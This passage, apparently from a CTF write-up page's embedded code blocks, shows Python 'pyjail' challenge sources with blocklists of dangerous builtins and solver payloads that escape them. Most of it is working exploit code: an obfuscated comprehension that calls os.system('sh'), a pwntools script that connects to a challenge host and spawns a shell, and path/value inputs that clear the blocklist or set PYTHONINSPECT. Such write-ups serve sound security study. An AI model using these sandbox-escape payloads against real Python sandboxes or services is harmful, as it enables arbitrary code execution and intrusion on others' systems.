    <span class="token string">'char'</span><span class="token punctuation">,</span> <span class="token string">'quit'</span><span class="token punctuation">,</span> <span class="token string">'getattr'</span><span class="token punctuation">,</span> <span class="token string">'locals'</span><span class="token punctuation">,</span> <span class="token string">'globals'</span><span class="token punctuation">,</span> <span class="token string">'len'</span><span class="token punctuation">,</span>
    <span class="token string">'exit'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span> <span class="token string">'blacklisted_words'</span><span class="token punctuation">,</span> <span class="token string">'print'</span><span class="token punctuation">,</span> <span class="token string">'builtins'</span><span class="token punctuation">,</span>
    <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'blacklisted_chars'</span><span class="token punctuation">,</span> <span class="token string">'repr'</span><span class="token punctuation">,</span> <span class="token string">'main'</span><span class="token punctuation">,</span> <span class="token string">'subclasses'</span><span class="token punctuation">,</span> <span class="token string">'file'</span><span class="token punctuation">,</span>
    <span class="token string">'class'</span><span class="token punctuation">,</span> <span class="token string">'mro'</span><span class="token punctuation">,</span> <span class="token string">'input'</span><span class="token punctuation">,</span> <span class="token string">'compile'</span><span class="token punctuation">,</span> <span class="token string">'init'</span><span class="token punctuation">,</span> <span class="token string">'doc'</span><span class="token punctuation">,</span> <span class="token string">'fork'</span><span class="token punctuation">,</span>
    <span class="token string">'popen'</span><span class="token punctuation">,</span> <span class="token string">'read'</span><span class="token punctuation">,</span> <span class="token string">'map'</span><span class="token punctuation">,</span> <span class="token string">'dir'</span><span class="token punctuation">,</span> <span class="token string">'help'</span><span class="token punctuation">,</span> <span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token string">'warning'</span><span class="token punctuation">,</span>
    <span class="token string">'func_globals'</span><span class="token punctuation">,</span> <span class="token string">'vars'</span><span class="token punctuation">,</span> <span class="token string">'filter'</span><span class="token punctuation">,</span> <span class="token string">'debug'</span><span class="token punctuation">,</span> <span class="token string">'object'</span><span class="token punctuation">,</span> <span class="token string">'next'</span><span class="token punctuation">,</span>
    <span class="token string">'word'</span><span class="token punctuation">,</span> <span class="token string">'base'</span><span class="token punctuation">,</span> <span class="token string">'prompt'</span><span class="token punctuation">,</span> <span class="token string">'breakpoint'</span><span class="token punctuation">,</span> <span class="token string">'class'</span><span class="token punctuation">,</span> <span class="token string">'pass'</span><span class="token punctuation">,</span>
    <span class="token string">'chr'</span><span class="token punctuation">,</span> <span class="token string">'ord'</span><span class="token punctuation">,</span> <span class="token string">'iter'</span><span class="token punctuation">,</span> <span class="token string">'banned'</span>
<span class="token punctuation">]</span>
blacklisted_unicode <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'\u202E'</span><span class="token punctuation">,</span> <span class="token string">'\u2060'</span><span class="token punctuation">,</span> <span class="token string">'\u200F'</span><span class="token punctuation">,</span> <span class="token string">'\u202A'</span><span class="token punctuation">,</span> <span class="token string">'\u202B'</span><span class="token punctuation">,</span> <span class="token string">'\u202C'</span>
    <span class="token string">'\u202D'</span><span class="token punctuation">,</span> <span class="token string">'\u202F'</span><span class="token punctuation">,</span> <span class="token string">'\u2061'</span><span class="token punctuation">,</span> <span class="token string">'\u2062'</span><span class="token punctuation">,</span> <span class="token string">'\u2063'</span><span class="token punctuation">,</span> <span class="token string">'\u2064'</span><span class="token punctuation">,</span> <span class="token string">'\uFEFF'</span>
<span class="token punctuation">]</span>

blacklisted_chars <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blacklisted_chars<span class="token punctuation">&#125;</span></span><span class="token string">]'</span></span>
blacklisted_words <span class="token operator">=</span> <span class="token string">'|'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>word<span class="token punctuation">&#125;</span></span><span class="token string">)'</span></span> <span class="token keyword">for</span> word <span class="token keyword">in</span> blacklisted_words<span class="token punctuation">)</span>
blacklisted_unicode_pattern <span class="token operator">=</span> <span class="token string">'|'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>blacklisted_unicode<span class="token punctuation">)</span>
blacklisted_nonascii <span class="token operator">=</span> <span class="token string">'[^\0-\x7F]'</span>

stdout <span class="token operator">=</span> Nobuffers<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">)</span>
stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''

        __..,,-----l"|-.
    __/"__  |----""  |  i--voo..,,__
 .-'=|:|/|-------o.,,,---. Y88888888o,,_
_+=:_|_|__|_|   ___|__|___-|  """"&#96;&#96;&#96;&#96;"""&#96;----------.........___
__============:' "" |==|__===========(=>=+    |           ,_, .-"&#96;--..._
  ;="|"|  |"| &#96;.____|__|__/===========(=>=+----+===-|---------&lt;---------_=-
 | ==|:|/| |   | o|.-'__,-|   .'  _______|o  &#96;----'|        __ __,.-'"
  "&#96;--""&#96;--"'"""&#96;.-+------'" .'  _L___,,...-----------"""""""   "
                  &#96;------""""""""

'''</span><span class="token punctuation">)</span>

stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'Enter command: '</span><span class="token punctuation">)</span>
prompt <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

prompt <span class="token operator">=</span> prompt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'unicode-escape'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span>
prompt <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>prompt<span class="token punctuation">,</span> <span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'unicode-escape'</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>blacklisted_chars<span class="token punctuation">,</span> prompt<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Blacklisted character detected. Go away!'</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>blacklisted_words<span class="token punctuation">,</span> prompt<span class="token punctuation">,</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Blacklisted word detected. Go away!'</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>blacklisted_unicode_pattern<span class="token punctuation">,</span> prompt<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Blacklisted unicode detected. Go away!'</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>blacklisted_nonascii<span class="token punctuation">,</span> prompt<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Non-ASCII character detected. Go away!'</span><span class="token punctuation">)</span>

<span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token keyword">exec</span><span class="token punctuation">(</span>prompt<span class="token punctuation">)</span>
<span class="token keyword">except</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span></code>`,fu,na,xe,Ce,e_,mu,aa,U2=`<code class="language-py"><span class="token comment"># @quasar - setting sys.stdout.flush to breakpoint</span>
<span class="token punctuation">[</span><span class="token builtin">id</span> <span class="token keyword">for</span> sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token builtin">id</span><span class="token punctuation">.</span>__self__<span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span>mA<span class="token punctuation">]</span> <span class="token keyword">for</span> aA<span class="token punctuation">,</span>bA<span class="token punctuation">,</span>cA<span class="token punctuation">,</span>dA<span class="token punctuation">,</span>eA<span class="token punctuation">,</span>fA<span class="token punctuation">,</span>gA<span class="token punctuation">,</span>hA<span class="token punctuation">,</span>iA<span class="token punctuation">,</span>jA<span class="token punctuation">,</span>kA<span class="token punctuation">,</span>lA<span class="token punctuation">,</span>mA<span class="token punctuation">,</span>nA<span class="token punctuation">,</span>oA<span class="token punctuation">,</span>pA<span class="token punctuation">,</span>qA<span class="token punctuation">,</span>rA<span class="token punctuation">,</span>sA<span class="token punctuation">,</span>tA<span class="token punctuation">,</span>uA<span class="token punctuation">,</span>vA<span class="token punctuation">,</span>wA<span class="token punctuation">,</span>xA<span class="token punctuation">,</span>yA<span class="token punctuation">,</span>zA<span class="token punctuation">,</span>aB<span class="token punctuation">,</span>bB<span class="token punctuation">,</span>cB<span class="token punctuation">,</span>dB<span class="token punctuation">,</span>eB<span class="token punctuation">,</span>fB<span class="token punctuation">,</span>gB<span class="token punctuation">,</span>hB<span class="token punctuation">,</span>iB<span class="token punctuation">,</span>jB<span class="token punctuation">,</span>kB<span class="token punctuation">,</span>lB<span class="token punctuation">,</span>mB<span class="token punctuation">,</span>nB<span class="token punctuation">,</span>oB<span class="token punctuation">,</span>pB<span class="token punctuation">,</span>qB<span class="token punctuation">,</span>rB<span class="token punctuation">,</span>sB<span class="token punctuation">,</span>tB<span class="token punctuation">,</span>uB<span class="token punctuation">,</span>vB<span class="token punctuation">,</span>wB<span class="token punctuation">,</span>xB<span class="token punctuation">,</span>yB<span class="token punctuation">,</span>zB<span class="token punctuation">,</span>aC<span class="token punctuation">,</span>bC<span class="token punctuation">,</span>cC<span class="token punctuation">,</span>dC<span class="token punctuation">,</span>eC<span class="token punctuation">,</span>fC<span class="token punctuation">,</span>gC<span class="token punctuation">,</span>hC<span class="token punctuation">,</span>iC<span class="token punctuation">,</span>jC<span class="token punctuation">,</span>kC<span class="token punctuation">,</span>lC<span class="token punctuation">,</span>mC<span class="token punctuation">,</span>nC<span class="token punctuation">,</span>oC<span class="token punctuation">,</span>pC<span class="token punctuation">,</span>qC<span class="token punctuation">,</span>rC<span class="token punctuation">,</span>sC<span class="token punctuation">,</span>tC<span class="token punctuation">,</span>uC<span class="token punctuation">,</span>vC<span class="token punctuation">,</span>wC<span class="token punctuation">,</span>xC<span class="token punctuation">,</span>yC<span class="token punctuation">,</span>zC<span class="token punctuation">,</span>aD<span class="token punctuation">,</span>bD<span class="token punctuation">,</span>cD<span class="token punctuation">,</span>dD<span class="token punctuation">,</span>eD<span class="token punctuation">,</span>fD<span class="token punctuation">,</span>gD<span class="token punctuation">,</span>hD<span class="token punctuation">,</span>iD<span class="token punctuation">,</span>jD<span class="token punctuation">,</span>kD<span class="token punctuation">,</span>lD<span class="token punctuation">,</span>mD<span class="token punctuation">,</span>nD<span class="token punctuation">,</span>oD<span class="token punctuation">,</span>pD<span class="token punctuation">,</span>qD<span class="token punctuation">,</span>rD<span class="token punctuation">,</span>sD<span class="token punctuation">,</span>tD<span class="token punctuation">,</span>uD<span class="token punctuation">,</span>vD<span class="token punctuation">,</span>wD<span class="token punctuation">,</span>xD<span class="token punctuation">,</span>yD<span class="token punctuation">,</span>zD<span class="token punctuation">,</span>aE<span class="token punctuation">,</span>bE<span class="token punctuation">,</span>cE<span class="token punctuation">,</span>dE<span class="token punctuation">,</span>eE<span class="token punctuation">,</span>fE<span class="token punctuation">,</span>gE<span class="token punctuation">,</span>hE<span class="token punctuation">,</span>iE<span class="token punctuation">,</span>jE<span class="token punctuation">,</span>kE<span class="token punctuation">,</span>lE<span class="token punctuation">,</span>mE<span class="token punctuation">,</span>nE<span class="token punctuation">,</span>oE<span class="token punctuation">,</span>pE<span class="token punctuation">,</span>qE<span class="token punctuation">,</span>rE<span class="token punctuation">,</span>sE<span class="token punctuation">,</span>tE<span class="token punctuation">,</span>uE<span class="token punctuation">,</span>vE<span class="token punctuation">,</span>wE<span class="token punctuation">,</span>xE<span class="token punctuation">,</span>yE<span class="token punctuation">,</span>zE<span class="token punctuation">,</span>aF<span class="token punctuation">,</span>bF<span class="token punctuation">,</span>cF<span class="token punctuation">,</span>dF<span class="token punctuation">,</span>eF<span class="token punctuation">,</span>fF<span class="token punctuation">,</span>gF<span class="token punctuation">,</span>hF<span class="token punctuation">,</span>iF<span class="token punctuation">,</span>jF<span class="token punctuation">,</span>kF<span class="token punctuation">,</span>lF<span class="token punctuation">,</span>mF<span class="token punctuation">,</span>nF<span class="token punctuation">,</span>oF<span class="token punctuation">,</span>pF<span class="token punctuation">,</span>qF<span class="token punctuation">,</span>rF<span class="token punctuation">,</span>sF<span class="token punctuation">,</span>tF<span class="token punctuation">,</span>uF<span class="token punctuation">,</span>vF<span class="token punctuation">,</span>wF<span class="token punctuation">,</span>xF<span class="token punctuation">,</span>yF<span class="token punctuation">,</span>zF<span class="token punctuation">,</span>aG <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token builtin">id</span><span class="token punctuation">.</span>__self__<span class="token punctuation">.</span>__dict__<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span>

<span class="token comment"># @st4rn - os.system("sh")</span>
<span class="token punctuation">[</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> re<span class="token punctuation">.</span>RegexFlag<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> re<span class="token punctuation">.</span>RegexFlag<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>get<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> re<span class="token punctuation">.</span>RegexFlag<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">[</span><span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span>re<span class="token punctuation">.</span>X<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>U<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>M<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>L<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>I<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>T<span class="token punctuation">.</span>value<span class="token punctuation">,</span> re<span class="token punctuation">.</span>X<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>U<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>S<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>I<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>T<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token keyword">for</span> re<span class="token punctuation">.</span>RegexFlag<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token builtin">bytearray</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>M<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>L<span class="token punctuation">.</span>value<span class="token punctuation">:</span>re<span class="token punctuation">.</span>I<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>L<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>M<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">.</span>system<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> re<span class="token punctuation">.</span>RegexFlag<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">[</span><span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span>re<span class="token punctuation">.</span>X<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>U<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>S<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>I<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>T<span class="token punctuation">.</span>value<span class="token punctuation">,</span> re<span class="token punctuation">.</span>X<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>U<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>M<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token keyword">for</span> re<span class="token punctuation">.</span>RegexFlag<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token builtin">bytearray</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>M<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>L<span class="token punctuation">.</span>value<span class="token punctuation">:</span>re<span class="token punctuation">.</span>I<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>L<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>M<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span>

<span class="token comment"># @Satoooon</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

payload <span class="token operator">=</span> <span class="token string">""</span>
<span class="token comment"># get builtins</span>
payload <span class="token operator">+=</span> <span class="token string">"for b in [sys.modules[[k for k in sys.modules][True]]]:None&#92;r"</span>
<span class="token comment"># get input()</span>
payload <span class="token operator">+=</span> <span class="token string">"for ks in [[k for k in b.__dict__]]:None&#92;r"</span>
payload <span class="token operator">+=</span> <span class="token string">"for ks in [ks[True:]]:None&#92;r"</span> <span class="token operator">*</span> <span class="token number">28</span>
payload <span class="token operator">+=</span> <span class="token string">"for inp in [b.__dict__[ks[False]]]:None&#92;r"</span>
<span class="token comment"># create "exec"</span>
payload <span class="token operator">+=</span> <span class="token string">"for Nobuffers.__getitem__ in [inp]:None&#92;r"</span>
payload <span class="token operator">+=</span> <span class="token string">"for s in [stdout[None]]:None&#92;r"</span>
<span class="token comment"># get exec()</span>
payload <span class="token operator">+=</span> <span class="token string">"for exc in [b.__dict__[s]]:None&#92;r"</span>
<span class="token comment"># exec(input())</span>
payload <span class="token operator">+=</span> <span class="token string">"for v in [stdout[None]]:None&#92;r"</span>
payload <span class="token operator">+=</span> <span class="token string">"for Nobuffers.__getitem__ in [exc]:None&#92;r"</span>
payload <span class="token operator">+=</span> <span class="token string">"stdout[v]"</span>

<span class="token comment"># io = process(["python3","./chall.py"])</span>
io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"starship.chal.crewc.tf"</span><span class="token punctuation">,</span> <span class="token number">40002</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"import os; os.system('sh')"</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code>`,bu,pa,Jp,c_,yu,ta,Le,Te,l_,gu,oa,M2=`<code class="language-py"><span class="token keyword">import</span> re
<span class="token keyword">import</span> ast

<span class="token keyword">import</span> void <span class="token comment"># void module contains an ascii art string</span>

<span class="token triple-quoted-string string">"""
Example:

( when root object is A )
path: .B.C["D"][1][2][3]
value: "pyjail is fun!"

->

A.B.C["D"][1][2][3] = "pyjail is fun!"

"""</span>

DISALLOWED_WORDS <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"os"</span><span class="token punctuation">,</span> <span class="token string">"posix"</span><span class="token punctuation">]</span>
ROOT_OBJECT <span class="token operator">=</span> void

<span class="token keyword">def</span> <span class="token function">abort</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
	exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">to_value</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">return</span> ast<span class="token punctuation">.</span>literal_eval<span class="token punctuation">(</span>s<span class="token punctuation">)</span>

<span class="token comment"># gift</span>
module <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"import: "</span><span class="token punctuation">)</span>
<span class="token builtin">__import__</span><span class="token punctuation">(</span>module<span class="token punctuation">)</span>

path <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"path: "</span><span class="token punctuation">)</span>
value <span class="token operator">=</span> to_value<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"value: "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

path<span class="token punctuation">,</span> _<span class="token punctuation">,</span> last_item_key<span class="token punctuation">,</span> last_attr_key <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">r"(.*)([(.*)]|.(.*))"</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">.</span>groups<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># set root object</span>
current_obj <span class="token operator">=</span> ROOT_OBJECT

<span class="token comment"># walk object</span>
<span class="token keyword">while</span> path <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">:</span>
	_<span class="token punctuation">,</span> item_key<span class="token punctuation">,</span> attr_key<span class="token punctuation">,</span> path <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">r"([(.*?)]|.([^.[]*))(.*)"</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">.</span>groups<span class="token punctuation">(</span><span class="token punctuation">)</span>

	<span class="token keyword">if</span> item_key <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
		item_key <span class="token operator">=</span> to_value<span class="token punctuation">(</span>item_key<span class="token punctuation">)</span>
		<span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span><span class="token punctuation">[</span>word <span class="token keyword">in</span> item_key <span class="token keyword">for</span> word <span class="token keyword">in</span> DISALLOWED_WORDS<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
			abort<span class="token punctuation">(</span><span class="token string">"deny"</span><span class="token punctuation">)</span>
		current_obj <span class="token operator">=</span> current_obj<span class="token punctuation">[</span>item_key<span class="token punctuation">]</span>
	<span class="token keyword">elif</span> attr_key <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
		<span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span><span class="token punctuation">[</span>word <span class="token keyword">in</span> attr_key <span class="token keyword">for</span> word <span class="token keyword">in</span> DISALLOWED_WORDS<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
			abort<span class="token punctuation">(</span><span class="token string">"deny"</span><span class="token punctuation">)</span>
		current_obj <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>current_obj<span class="token punctuation">,</span> attr_key<span class="token punctuation">)</span>
	<span class="token keyword">else</span><span class="token punctuation">:</span>
		abort<span class="token punctuation">(</span><span class="token string">"invalid"</span><span class="token punctuation">)</span>


<span class="token comment"># set value</span>
<span class="token keyword">if</span> last_item_key <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
	last_item_key <span class="token operator">=</span> to_value<span class="token punctuation">(</span>last_item_key<span class="token punctuation">)</span>
	current_obj<span class="token punctuation">[</span>last_item_key<span class="token punctuation">]</span> <span class="token operator">=</span> value
<span class="token keyword">elif</span> last_attr_key <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
	<span class="token builtin">setattr</span><span class="token punctuation">(</span>current_obj<span class="token punctuation">,</span> last_attr_key<span class="token punctuation">,</span> value<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Done"</span><span class="token punctuation">)</span></code>`,wu,ea,Ae,Oe,u_,vu,ca,S2=`<code class="language-py"><span class="token comment"># @Satoooon - https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Ffrom+os+import+environ%2F&amp;type=code</span>
<span class="token keyword">import</span><span class="token punctuation">:</span> ctypes<span class="token punctuation">.</span>_aix
path<span class="token punctuation">:</span> <span class="token punctuation">.</span>__loader__<span class="token punctuation">.</span>exec_module<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"sys"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"ctypes._aix"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">"PYTHONINSPECT"</span><span class="token punctuation">]</span>
value<span class="token punctuation">:</span> <span class="token string">"1"</span>

<span class="token comment"># @maple3142</span>
<span class="token keyword">import</span><span class="token punctuation">:</span> main
<span class="token keyword">import</span><span class="token punctuation">:</span> os
path<span class="token punctuation">:</span> <span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"help"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__repr__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"sys"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"__main__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>DISALLOWED_WORDS
value<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
path<span class="token punctuation">:</span> <span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"help"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__repr__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"sys"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"os"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">"PYTHONINSPECT"</span><span class="token punctuation">]</span>
value<span class="token punctuation">:</span> <span class="token string">"1"</span></code>`,Eu,la,Kp,r_,hu,ua,Fe,Re,k_,xu,ra,B2=`<code class="language-py"><span class="token comment">#!/usr/local/bin/python3</span>
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> types
<span class="token keyword">import</span> dis

<span class="token keyword">def</span> <span class="token function">is_valid</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">:</span>
